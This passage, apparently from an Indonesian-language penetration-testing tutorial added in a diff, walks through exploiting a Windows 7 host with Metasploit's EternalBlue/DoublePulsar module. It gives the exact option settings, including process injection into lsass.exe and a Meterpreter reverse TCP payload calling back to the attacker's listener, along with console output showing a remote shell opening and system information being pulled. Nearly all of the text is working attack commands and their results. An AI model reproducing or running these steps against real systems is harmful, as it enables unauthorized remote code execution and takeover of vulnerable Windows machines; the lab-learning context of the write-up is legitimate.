+   RHOSTS                                                               yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT               445                                              yes       The SMB service port (TCP)
+   TARGETARCHITECTURE  x86                                              yes       Target Architecture (Accepted: x86, x64)
+   WINEPATH            /root/.wine/drive_c/                             yes       WINE drive_c path
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.1.21     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   8   Windows 7 (all services pack) (x86) (x64)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/eternalblue_doublepulsar) > set RHOSTS 192.168.1.5
+RHOSTS => 192.168.1.5
+msf6 exploit(windows/smb/eternalblue_doublepulsar) >
+```
+
+Dari options di atas yang perlu diperhatikan adalah versi dari windows target, jika versi 32bit maka bagian `PROCESSINJECT` dan bagian `Payload options (windows/meterpreter/reverse_tcp):` tidak ada perubahan. Karena target saya menggunakan Windows 7 64bit maka perubahan sebagai berikut:
+
+```
+msf6 exploit(windows/smb/eternalblue_doublepulsar) > set RHOSTS 192.168.1.5
+RHOSTS => 192.168.1.5
+msf6 exploit(windows/smb/eternalblue_doublepulsar) > set PROCESSINJECT lsass.exe
+PROCESSINJECT => lsass.exe
+msf6 exploit(windows/smb/eternalblue_doublepulsar) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/eternalblue_doublepulsar) > run
+
+[*] Started reverse TCP handler on 192.168.1.21:4444 
+[*] 192.168.1.5:445 - Generating Eternalblue XML data
+[*] 192.168.1.5:445 - Generating Doublepulsar XML data
+[*] 192.168.1.5:445 - Generating payload DLL for Doublepulsar
+[*] 192.168.1.5:445 - Writing DLL in /root/.wine/drive_c/eternal11.dll
+[*] 192.168.1.5:445 - Launching Eternalblue...
+[+] 192.168.1.5:445 - Backdoor is already installed
+[*] 192.168.1.5:445 - Launching Doublepulsar...
+[*] Sending stage (203846 bytes) to 192.168.1.5
+[*] Meterpreter session 1 opened (192.168.1.21:4444 -> 192.168.1.5:49160) at 2024-12-19 23:26:54 +0800
+[+] 192.168.1.5:445 - Remote code executed... 3... 2... 1...
+
+meterpreter > sysinfo
+Computer        : WINDOWS7
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+meterpreter > 
+```
+
+Bangggg!!!!
